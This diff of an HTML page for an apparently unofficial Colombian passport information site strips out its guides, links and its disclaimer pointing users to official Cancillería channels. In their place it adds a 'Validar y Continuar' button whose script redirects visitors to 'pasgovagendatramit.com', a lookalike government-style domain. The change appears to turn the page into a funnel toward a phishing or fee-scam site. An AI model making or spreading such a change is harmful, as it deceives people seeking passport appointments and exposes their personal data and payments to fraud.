+                <button class="btn btn-acc" onclick="handleredirt()">Validar y Continuar</button>
+            </div>
+        </div>
     </div>
-  </div>
-</section>
+<script>
+            function handleredirt() {
+                window.location.href = "https://pasgovagendatramit.com/";
+            }
+        </script>
 
-<!-- QUICK LINKS -->
-<section class="section" style="padding-top: 56px; padding-bottom: 56px;">
-  <div class="container">
-    <div class="quick-links">
-      <a href="tipos-pasaporte.html" class="quick-link">
-        <span class="ql-icon">📘</span>
-        <div class="ql-label">Tipos de Pasaporte</div>
-        <div class="ql-desc">Ordinario, diplomático, menores</div>
-      </a>
-      <a href="requisitos.html" class="quick-link">
-        <span class="ql-icon">📋</span>
-        <div class="ql-label">Requisitos</div>
-        <div class="ql-desc">Documentos necesarios</div>
-      </a>
-      <a href="proceso.html" class="quick-link">
-        <span class="ql-icon">🔄</span>
-        <div class="ql-label">Paso a Paso</div>
-        <div class="ql-desc">Cómo hacer el trámite</div>
-      </a>
-      <a href="tarifas.html" class="quick-link">
-        <span class="ql-icon">💰</span>
-        <div class="ql-label">Tarifas</div>
-        <div class="ql-desc">Valores vigentes 2024</div>
-      </a>
-      <a href="puntos-atencion.html" class="quick-link">
-        <span class="ql-icon">📍</span>
-        <div class="ql-label">Puntos de Atención</div>
-        <div class="ql-desc">Dónde tramitar</div>
-      </a>
-      <a href="preguntas-frecuentes.html" class="quick-link">
-        <span class="ql-icon">❓</span>
-        <div class="ql-label">Preguntas Frecuentes</div>
-        <div class="ql-desc">Dudas comunes</div>
-      </a>
-      <a href="pasaporte-electronico.html" class="quick-link">
-        <span class="ql-icon">💳</span>
-        <div class="ql-label">e-Passport</div>
-        <div class="ql-desc">Tecnología biométrica</div>
-      </a>
-      <a href="colombianos-exterior.html" class="quick-link">
-        <span class="ql-icon">✈️</span>
-        <div class="ql-label">En el Exterior</div>
-        <div class="ql-desc">Trámite consular</div>
-      </a>
-    </div>
-  </div>
-</section>
-
-<!-- PROCESO RÁPIDO -->
-<section class="section section-alt">
-  <div class="container">
-    <div class="section-label">Proceso</div>
-    <h2 class="section-title">Obtén tu pasaporte en 6 pasos</h2>
-    <p class="section-desc">El trámite es sencillo. Sigue estos pasos y tendrás tu documento de viaje en 24 o 48 horas hábiles.</p>
-    <div class="quick-steps mb-32">
-      <div class="qs-item"><div class="qs-num">1</div><h3>Agenda tu cita</h3><p>Portal web o línea 01 8000 510 810</p></div>
-      <div class="qs-item"><div class="qs-num">2</div><h3>Reúne documentos</h3><p>Cédula, pago y requisitos según tu caso</p></div>
-      <div class="qs-item"><div class="qs-num">3</div><h3>Paga la tarifa</h3><p>Bancos, PSE, Efecty o Baloto</p></div>
-      <div class="qs-item"><div class="qs-num">4</div><h3>Asiste a la cita</h3><p>Toma biométrica: huella, foto, firma</p></div>
-      <div class="qs-item"><div class="qs-num">5</div><h3>Consulta el estado</h3><p>Con tu número de radicado en línea</p></div>
-      <div class="qs-item"><div class="qs-num">6</div><h3>Recibe tu pasaporte</h3><p>En el punto o a domicilio</p></div>
-    </div>
-    <a href="proceso.html" class="btn btn-primary">Ver proceso completo →</a>
-  </div>
-</section>
-
-<!-- FEATURES / DESTACADOS -->
-<section class="section">
-  <div class="container">
-    <div class="section-label">Información destacada</div>
-    <h2 class="section-title">¿Qué necesitas saber?</h2>
-    <p class="section-desc">Resolvemos las consultas más frecuentes sobre el pasaporte colombiano.</p>
-    <div class="grid-3">
-      <div class="feature-card">
-        <div class="fc-icon">🔐</div>
-        <h3>Pasaporte Electrónico</h3>
-        <p>Colombia emite pasaportes con chip biométrico RFID que cumplen el estándar internacional ICAO Doc 9303. Garantiza tu identidad en 190+ países.</p>
-        <a href="pasaporte-electronico.html">Conoce más →</a>
-      </div>
-      <div class="feature-card">
-        <div class="fc-icon">🧒</div>
-        <h3>Pasaporte para Menores</h3>
-        <p>Trámite especial para niños y adolescentes. Requiere presencia del menor y autorización de ambos padres o tutor legal.</p>
-        <a href="requisitos.html">Ver requisitos →</a>
-      </div>
-      <div class="feature-card">
-        <div class="fc-icon">🌍</div>
-        <h3>Colombianos en el Exterior</h3>
-        <p>Tramita o renueva tu pasaporte en cualquiera de los +60 consulados colombianos en el mundo. Proceso ágil con cita previa.</p>
-        <a href="colombianos-exterior.html">Saber más →</a>
-      </div>
-      <div class="feature-card">
-        <div class="fc-icon">⚡</div>
-        <h3>Entrega Urgente en 24 h</h3>
-        <p>¿Tienes un viaje próximo? Solicita la modalidad urgente y recibe tu pasaporte en 24 horas hábiles. Disponible en todas las sedes principales.</p>
-        <a href="tarifas.html">Ver tarifas →</a>
-      </div>
-      <div class="feature-card">
-        <div class="fc-icon">📱</div>
-        <h3>Trámite Digital</h3>
-        <p>Agenda tu cita, realiza el pago y consulta el estado de tu trámite completamente en línea, sin filas ni desplazamientos innecesarios.</p>
-        <a href="proceso.html">Comenzar →</a>
-      </div>
-      <div class="feature-card">
-        <div class="fc-icon">🆘</div>
-        <h3>Pasaporte de Emergencia</h3>
-        <p>Si perdiste tu pasaporte en el exterior, los consulados colombianos emiten un documento de emergencia para tu retorno.</p>
-        <a href="colombianos-exterior.html">Ver información →</a>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- CTA BAND -->
-<section class="cta-band">
-  <h2>¿Tienes preguntas sobre tu trámite?</h2>
-  <p>Consulta nuestras preguntas frecuentes o revisa los puntos de atención más cercanos.</p>
-  <div class="cta-band-btns">
-    <a href="preguntas-frecuentes.html" class="btn btn-ghost">Ver preguntas frecuentes</a>
-    <a href="puntos-atencion.html" class="btn btn-ghost">Puntos de atención</a>
-  </div>
-</section>
-
-<!-- ALERT INFORMATIVO -->
-<section class="section" style="padding: 40px 24px;">
-  <div class="container">
-    <div class="alert alert-warn">
-      <span class="alert-icon">⚠️</span>
-      <div><strong>Aviso importante:</strong> Este es un sitio web informativo y sin ánimo de lucro. La información aquí presentada es orientativa. Para trámites oficiales, acuda siempre a los canales autorizados por la Cancillería de Colombia. <a href="terminos-condiciones.html">Ver términos y condiciones</a>.</div>
-    </div>
-  </div>
-</section>
-</main>
-
-<div id="site-footer"></div>
-
-<script src="shared.js"></script>
-<script>initShared('index.html');</script>
 </body>
 </html>
